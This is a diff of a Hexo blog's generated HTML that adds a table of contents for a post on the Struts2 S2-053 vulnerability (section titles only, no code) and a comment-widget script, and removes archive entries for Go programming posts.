+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-环境搭建"><span class="toc-number">2.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-漏洞检测和利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞检测和利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#通用的poc："><span class="toc-number">3.1.</span> <span class="toc-text">通用的poc：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通用的EXP"><span class="toc-number">3.2.</span> <span class="toc-text">通用的EXP:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附python批量漏洞检测代码："><span class="toc-number">3.3.</span> <span class="toc-text">附python批量漏洞检测代码：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-漏洞验证"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-漏洞修复建议"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞修复建议</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/05/并发编程/" class="archive-article-date">
-  	<time datetime="2017-09-05T07:02:07.165Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/05/并发编程/">并发编程</a>
-    </h1>
-  
+  <div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="s2-053" data-title="S2-053" data-url="http://www.cmustarc.com/2017/09/15/s2-053/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">golang</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">并发</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/notes//" class="article-tag-list-link color1">notes</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/05/hexo+github+nginx VPS搭建博客/" class="archive-article-date">
-  	<time datetime="2017-09-05T07:00:22.038Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/05/hexo+github+nginx VPS搭建博客/">hexo+github+nginx vps搭建博客</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">博客</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/notes//" class="article-tag-list-link color1">notes</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/05/go语言初识/" class="archive-article-date">
-  	<time datetime="2017-09-05T07:00:05.936Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/05/go语言初识/">初识go语言</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">golang</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">编程语言</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/notes//" class="article-tag-list-link color1">notes</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/05/goroutine与调度器/" class="archive-article-date">
-  	<time datetime="2017-09-05T06:21:31.521Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-05</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/05/goroutine与调度器/">goroutine与调度器[转]</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">golang</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">编程语言</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/notes//" class="article-tag-list-link color1">notes</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
+  
+
+  
+
+  
+
 
 
           </div>
@@ -531,10 +466,10 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
-		isCategory: true,
+		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: false,
 		root: "/",
